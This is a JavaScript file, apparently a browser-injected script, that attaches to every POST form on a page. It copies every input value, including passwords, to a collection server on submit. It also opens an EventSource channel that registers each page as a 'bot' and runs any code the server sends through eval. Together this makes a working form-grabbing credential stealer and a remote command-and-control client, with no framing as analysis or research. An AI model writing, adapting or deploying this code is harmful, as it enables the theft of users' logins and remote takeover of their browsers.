(function () {
  'use strict';

  var server = 'http://localhost:4567/';
  var logging = true;

  var $ = utils();

  var logger = (function(logging) {
    var log = function (level) {
      return function() {
        if (logging) console[level].apply(null, arguments);
      };
    };
    return {
      log   : log('log'),
      info  : log('info'),
      warn  : log('warn'),
      error : log('error')
    };
  })(logging);

  $('form').each(function (form, index) {

    // only interested in post forms
    if (form.method.toLowerCase() !== 'post') {
      return;
    }

    logger.info('hooked a post form');

    form.addEventListener('submit', function (e) {
      //e.preventDefault();

      var inputId = 1,
      data = {
        from_url: location.href
      };

      // collect form data
      $('input', form).each(function (input, index) {
        data[inputId++ + '.' + input.type] = {
          name : input.name,
          value: input.value
        };
      });

      // post data to server
      return !!$.ajax({
        method: 'post',
        url: server+'records',
        async: false,
        data: data,
        contentType: 'json'
      });
    });

  });

  if (window.top == window.self) { // if not iframe
    // if not iframe
    // each page should only be considered as one bot
    // also that if i have multiple event source in one page, they'll stop reconnect in a short time

    var eventSource = new EventSource(server+'listen/commands'+$.serializeParameters({location: window.location.hostname}, '?'));

    eventSource.onmessage = function(e) {
      logger.info(e.data);
    };

    eventSource.addEventListener('eval', function(e) {
      (0, eval)(e.data);
      logger.info('evaled: ' + e.data);
    }, false);

    eventSource.addEventListener('disconnect', function(e) {
      eventSource.close();
      logger.info('connection closed');
    }, false);

    eventSource.addEventListener('unknown', function(e) {
      logger.error('unknown event received');
    }, false);

    eventSource.onerror = function(e) {
      logger.warn("connection lost, reconnecting...");
    };
  }
})();
